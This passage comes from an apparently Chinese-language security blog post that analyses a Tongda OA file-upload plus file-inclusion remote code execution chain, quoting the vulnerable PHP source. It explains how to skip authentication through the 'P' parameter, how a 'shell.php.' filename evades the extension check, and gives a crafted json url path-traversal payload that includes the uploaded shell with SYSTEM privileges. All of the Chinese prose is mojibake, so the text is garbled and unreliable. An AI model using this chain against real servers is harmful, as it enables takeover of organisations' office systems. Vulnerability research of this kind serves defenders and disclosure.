mysql_insert_id();</span><br><span class="line">            <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'ÃŠÃ½Â¾ÃÂ¿Ã¢Â²Ã™Ã—Ã·ÃŠÂ§Â°Ãœ'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($FILE_ID == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'ÃŠÃ½Â¾ÃÂ¿Ã¢Â²Ã™Ã—Ã·ÃŠÂ§Â°Ãœ2'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK ,'</span> . $FILE_ID . <span class="string">','</span> . $msg_id;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸‹å¼€å¤´è¿™ä¸€å—ï¼Œå°±æ˜¯ç»•è¿‡çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œè¿™é‡Œè·å–äº†ä¸€ä¸ªPï¼Œå¦‚æœPå­˜åœ¨æˆ–è€…ä¸ä¸ºç©ºï¼Œå°±è¦åŒ…å«ä¸Šé¢çš„auth.phpï¼Œæ‰€ä»¥é€šè¿‡è¿™é‡Œçš„å‚æ•°â€Pâ€ç»•è¿‡ç™»å½•è®¤è¯ï¼Œå°±å¯ä»¥å»ä¸‹é¢çš„ä¸Šä¼ äº†ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">'P'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || $P != <span class="string">''</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'./auth.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†å¾€åå°±æ˜¯ä¸¤ä¸ªIFæ¡ä»¶å¥ï¼Œåªè¦è¿›å»äº†éƒ½è¦exité€€å‡ºï¼Œæ‰€ä»¥è¦ç»•è¿‡æ‰èƒ½è¿›å…¥ä¸Šä¼ çš„é€»è¾‘é‡Œé¢ï¼Œ$DEST_UID = $_POST[â€˜DEST_UIDâ€™]; å‚æ•°å¯æ§ï¼Œè¦æ±‚ä¸èƒ½ä¸º0 ä¹Ÿä¸èƒ½ä¸ºç©ºå°±å¯ä»¥äº†ã€‚1&lt;=count($_FILES)åˆ¤æ–­æ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ ï¼Œå¦‚æœä¸Šä¼ åŒ…ä¸­å­˜åœ¨æ–‡ä»¶ä¸”$UPLOAD_MODE == â€˜1â€™åˆ™è°ƒç”¨upload()ä¸Šä¼ ã€‚ç¬¬ä¸€ä¸ªä¸‹æ ‡å¿…é¡»æ˜¯æˆ‘ä»¬çš„input nameå€¼ï¼Œå› æ­¤æˆ‘ä»¬çš„POSTåŒ…çš„Content-Disposition: form-data; name=â€œATTACHMENTâ€; filename=â€jpgâ€ä¸­çš„nameå¿…é¡»æ˜¯â€™ATTACHMENTâ€™ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$TYPE = $_POST[<span class="string">'TYPE'</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">'DEST_UID'</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID != <span class="string">''</span> &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'Â½Ã“ÃŠÃ•Â·Â½IDÃÃÃÂ§'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">','</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'Â½Ã“ÃŠÃ•Â·Â½IDÃÃÃÂ§'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MODULE = <span class="string">'im'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) != strlen($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            $_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>] = urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“å‰è¡Œçš„ä»£ç å†…å®¹æœ‰uploadå‡½æ•°ï¼Œå‡½æ•°å…·ä½“ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($PREFIX = <span class="string">'ATTACHMENT'</span>, $MODULE = <span class="string">''</span>, $OUTPUT = true)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr($MODULE, <span class="string">'/'</span>) || strstr($MODULE, <span class="string">'\\'</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">            <span class="keyword">return</span> _(<span class="string">'å‚æ•°å«æœ‰éæ³•å­—ç¬¦ã€‚'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Message(_(<span class="string">'é”™è¯¯'</span>), _(<span class="string">'å‚æ•°å«æœ‰éæ³•å­—ç¬¦ã€‚'</span>));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = <span class="keyword">array</span>(<span class="string">'ID'</span> =&gt; <span class="string">''</span>, <span class="string">'NAME'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">    reset($_FILES);</span><br><span class="line">    <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $KEY =&gt; $ATTACHMENT) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACHMENT[<span class="string">'error'</span>] == <span class="number">4</span> || $KEY != $PREFIX &amp;&amp; substr($KEY, <span class="number">0</span>, strlen($PREFIX) + <span class="number">1</span>) != $PREFIX . <span class="string">'_'</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data_charset = <span class="keyword">isset</span>($_GET[<span class="string">'data_charset'</span>]) ? $_GET[<span class="string">'data_charset'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'data_charset'</span>]) ? $_POST[<span class="string">'data_charset'</span>] : <span class="string">''</span>);</span><br><span class="line">        $ATTACH_NAME = $data_charset != <span class="string">''</span> ? td_iconv($ATTACHMENT[<span class="string">'name'</span>], $data_charset, MYOA_CHARSET) : $ATTACHMENT[<span class="string">'name'</span>];</span><br><span class="line">        $ATTACH_SIZE = $ATTACHMENT[<span class="string">'size'</span>];</span><br><span class="line">        $ATTACH_ERROR = $ATTACHMENT[<span class="string">'error'</span>];</span><br><span class="line">        $ATTACH_FILE = $ATTACHMENT[<span class="string">'tmp_name'</span>];</span><br><span class="line">        $ERROR_DESC = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_uploadable($ATTACH_NAME)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'ç¦æ­¢ä¸Šä¼ åç¼€åä¸º[%s]çš„æ–‡ä»¶'</span>), substr($ATTACH_NAME, strrpos($ATTACH_NAME, <span class="string">'.'</span>) + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            $encode = mb_detect_encoding($ATTACH_NAME, <span class="keyword">array</span>(<span class="string">'ASCII'</span>, <span class="string">'UTF-8'</span>, <span class="string">'GB2312'</span>, <span class="string">'GBK'</span>, <span class="string">'BIG5'</span>));</span><br><span class="line">            <span class="keyword">if</span> ($encode != <span class="string">'UTF-8'</span>) &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = mb_convert_encoding($ATTACH_NAME, <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = $ATTACH_NAME;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\\\':&lt;&gt;?]|\\/|\\\\|"|\\|/u'</span>, $ATTACH_NAME_UTF8)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'æ–‡ä»¶å[%s]åŒ…å«[/\\\'":*?&lt;&gt;|]ç­‰éæ³•å­—ç¬¦'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'æ–‡ä»¶[%s]å¤§å°ä¸º0å­—èŠ‚'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ERROR_DESC == <span class="string">''</span>) &#123;</span><br><span class="line">                $ATTACH_NAME = str_replace(<span class="string">'\''</span>, <span class="string">''</span>, $ATTACH_NAME);</span><br><span class="line">                $ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ID === <span class="keyword">false</span>) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'æ–‡ä»¶[%s]ä¸Šä¼ å¤±è´¥'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'ID'</span>] .= $ATTACH_ID . <span class="string">','</span>;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'NAME'</span>] .= $ATTACH_NAME . <span class="string">'*'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            @unlink($ATTACH_FILE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'æ–‡ä»¶[%s]çš„å¤§å°è¶…è¿‡äº†ç³»ç»Ÿé™åˆ¶ï¼ˆ%sï¼‰'</span>), $ATTACH_NAME, ini_get(<span class="string">'upload_max_filesize'</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'æ–‡ä»¶[%s]çš„å¤§å°è¶…è¿‡äº†è¡¨å•é™åˆ¶'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) &#123;</span><br><span class="line">                        $ERROR_DESC = sprintf(_(<span class="string">'æ–‡ä»¶[%s]ä¸Šä¼ ä¸å®Œæ•´'</span>), $ATTACH_NAME);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_NO_TMP_DIR) &#123;</span><br><span class="line">                            $ERROR_DESC = sprintf(_(<span class="string">'æ–‡ä»¶[%s]ä¸Šä¼ å¤±è´¥ï¼šæ‰¾ä¸åˆ°ä¸´æ—¶æ–‡ä»¶å¤¹'</span>), $ATTACH_NAME);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_CANT_WRITE) &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'æ–‡ä»¶[%s]å†™å…¥å¤±è´¥'</span>), $ATTACH_NAME);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'æœªçŸ¥é”™è¯¯[ä»£ç ï¼š%s]'</span>), $ATTACH_ERROR);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($ERROR_DESC != <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">                delete_attach($ATTACHMENTS[<span class="string">'ID'</span>], $ATTACHMENTS[<span class="string">'NAME'</span>], $MODULE);</span><br><span class="line">                <span class="keyword">return</span> $ERROR_DESC;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Message(_(<span class="string">'é”™è¯¯'</span>), $ERROR_DESC);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ATTACHMENTS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°is_uploadable()å‡½æ•°å¯¹æ–‡ä»¶åè¿›è¡Œæ£€æŸ¥ï¼Œè·Ÿè¿›åˆ°è¯¥å‡½æ•°ï¼Œä½äºinc/utility_file.phpã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_uploadable</span><span class="params">($FILE_NAME)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Â  Â  $POS = strrpos($FILE_NAME, <span class="string">'.'</span>);</span><br><span class="line">Â  Â  <span class="keyword">if</span> ($POS === <span class="keyword">false</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  $EXT_NAME = $FILE_NAME;</span><br><span class="line">Â  Â  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>, <span class="number">3</span>)) == <span class="string">'php'</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  $EXT_NAME = strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>));</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">if</span> (find_id(MYOA_UPLOAD_FORBIDDEN_TYPE, $EXT_NAME)) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">if</span> (MYOA_UPLOAD_LIMIT == <span class="number">0</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">Â  Â  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (MYOA_UPLOAD_LIMIT == <span class="number">1</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> !find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);</span><br><span class="line">Â  Â  Â  Â  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">if</span> (MYOA_UPLOAD_LIMIT == <span class="number">2</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);</span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»£ç æ„æ€æ˜¯æŸ¥æ‰¾â€œ.â€ åœ¨æ–‡ä»¶åä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œç„¶åä»å­˜åœ¨â€.â€œ å¼€å§‹åŒ¹é…3ä½ï¼Œåˆ¤æ–­åç¼€æ˜¯å¦ä¸ºphpï¼Œ,å¦‚æœä¸ºphpåˆ™è¿”å›false,å¦åˆ™å°†â€.â€ä¹‹å‰çš„ä½œä¸ºEXT_NAMEï¼Œ.phpä¸è¡Œï¼Œåªèƒ½æ˜¯ shell.php. æˆ–è€… shell.php.pngã€‚é…åˆæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_uploadable</span><span class="params">($FILE_NAME)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Â  Â  $POS = strrpos($FILE_NAME, <span class="string">'.'</span>);</span><br><span class="line">Â  Â  <span class="keyword">if</span> ($POS === <span class="keyword">false</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  $EXT_NAME = $FILE_NAME;</span><br><span class="line">Â  Â  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>, <span class="number">3</span>)) == <span class="string">'php'</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  $EXT_NAME = strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶åŒ…å«éƒ¨åˆ†</p>
<p>æ–‡ä»¶ä½äºwebroot\ispirit\interface\gateway.phpï¼Œä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/conn.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_org.php'</span>;</span><br><span class="line"><span class="keyword">if</span> ($P != <span class="string">''</span>) &#123;</span><br><span class="line">Â  Â  <span class="keyword">if</span> (preg_match(<span class="string">'/[^a-z0-9;]+/i'</span>, $P)) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">echo</span> _(<span class="string">'éæ³•å‚æ•°'</span>);</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">exit</span>;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  session_id($P);</span><br><span class="line">Â  Â  session_start();</span><br><span class="line">Â  Â  session_write_close();</span><br><span class="line">Â  Â  <span class="keyword">if</span> ($_SESSION[<span class="string">'LOGIN_USER_ID'</span>] == <span class="string">''</span> || $_SESSION[<span class="string">'LOGIN_UID'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">echo</span> _(<span class="string">'RELOGIN'</span>);</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">exit</span>;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($json) &#123;</span><br><span class="line">Â  Â  $json = stripcslashes($json);</span><br><span class="line">Â  Â  $json = (<span class="keyword">array</span>) json_decode($json);</span><br><span class="line">Â  Â  <span class="keyword">foreach</span> ($json <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> ($key == <span class="string">'data'</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  $val = (<span class="keyword">array</span>) $val;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">foreach</span> ($val <span class="keyword">as</span> $keys =&gt; $value) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  $&#123;$keys&#125; = $value;</span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> ($key == <span class="string">'url'</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  $url = $val;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">if</span> ($url != <span class="string">''</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (substr($url, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">'/'</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  $url = substr($url, <span class="number">1</span>);</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (strpos($url, <span class="string">'general/'</span>) !== <span class="keyword">false</span> || strpos($url, <span class="string">'ispirit/'</span>) !== <span class="keyword">false</span> || strpos($url, <span class="string">'module/'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">include_once</span> $url;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¿™é‡Œä¸ä¼ é€’å‚æ•°Pä¸ºç©ºï¼Œå°±ä»¥ç»•è¿‡å‰é¢ä¸€ç³»åˆ—çš„æ£€æµ‹ï¼Œéšåä»jsonä¸­è·å–urlå‚æ•°çš„å€¼ï¼Œåªè¦ general/ã€ispirit/ã€module/ åœ¨urlå†…ï¼Œç›´æ¥åŒ…å« $urlã€‚é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥æ„é€ json={â€œurlâ€:â€../../general/../../attach/im/xxxx/xxxxxxxxxx.jpgâ€}ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($json) &#123;</span><br><span class="line">Â  Â  $json = stripcslashes($json);</span><br><span class="line">Â  Â  $json = (<span class="keyword">array</span>) json_decode($json);</span><br><span class="line">Â  Â  <span class="keyword">foreach</span> ($json <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> ($key == <span class="string">'data'</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  $val = (<span class="keyword">array</span>) $val;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">foreach</span> ($val <span class="keyword">as</span> $keys =&gt; $value) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  $&#123;$keys&#125; = $value;</span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> ($key == <span class="string">'url'</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  $url = $val;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">if</span> ($url != <span class="string">''</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (substr($url, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">'/'</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  $url = substr($url, <span class="number">1</span>);</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (strpos($url, <span class="string">'general/'</span>) !== <span class="keyword">false</span> || strpos($url, <span class="string">'ispirit/'</span>) !== <span class="keyword">false</span> || strpos($url, <span class="string">'module/'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">include_once</span> $url;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è‡³æ­¤æ–‡ä»¶ä¸Šä¼ ç»“åˆæ–‡ä»¶åŒ…å«å¯ç›´æ¥getshellï¼Œä¸”å› ä¸ºé€šè¾¾OAä»¥systemæƒé™è¿è¡Œï¼Œæ•…shellæƒé™ä¸ºsystemã€‚</p>
<h2 id="2-æ¼æ´éªŒè¯"><a href="#2-æ¼æ´éªŒè¯" class="headerlink" title="2. æ¼æ´éªŒè¯"></a>2. æ¼æ´éªŒè¯</h2><h3 id="2-1-ä¸‹è½½åœ°å€"><a href="#2-1-ä¸‹è½½åœ°å€" class="headerlink" title="2.1 ä¸‹è½½åœ°å€"></a>2.1 ä¸‹è½½åœ°å€</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.tongda2000.com&#x2F;download&#x2F;down.php?VERSION&#x3D;2019&amp;code&#x3D;86d3V9EzrapwAKhPkxfbNZDsfB48gbFvbS0QYsUr%2FnNWNP2e5Fn%2F&amp;F&#x3D;baidu_natural&amp;K&#x3D;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-å°†ä¸‹è½½çš„exeä¸‹è½½å®‰è£…å³å¯"><a href="#2-2-å°†ä¸‹è½½çš„exeä¸‹è½½å®‰è£…å³å¯" class="headerlink" title="2.2 å°†ä¸‹è½½çš„exeä¸‹è½½å®‰è£…å³å¯"></a>2.2 å°†ä¸‹è½½çš„exeä¸‹è½½å®‰è£…å³å¯</h3><h3 id="2-3-åœ¨å·¦ä¸‹è§’å¼€å§‹æ‰¾åˆ°é€šè¾¾ç½‘ç»œåŠå…¬è¿›è¡ŒæœåŠ¡å¯åŠ¨ã€‚"><a href="#2-3-åœ¨å·¦ä¸‹è§’å¼€å§‹æ‰¾åˆ°é€šè¾¾ç½‘ç»œåŠå…¬è¿›è¡ŒæœåŠ¡å¯åŠ¨ã€‚" class="headerlink" title="2.3 åœ¨å·¦ä¸‹è§’å¼€å§‹æ‰¾åˆ°é€šè¾¾ç½‘ç»œåŠå…¬è¿›è¡ŒæœåŠ¡å¯åŠ¨ã€‚"></a>2.3 åœ¨å·¦ä¸‹è§’å¼€å§‹æ‰¾åˆ°é€šè¾¾ç½‘ç»œåŠå…¬è¿›è¡ŒæœåŠ¡å¯åŠ¨ã€‚</h3><p><img src="/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/image-20200414232909365.png" alt="image-20200414232909365"></p>
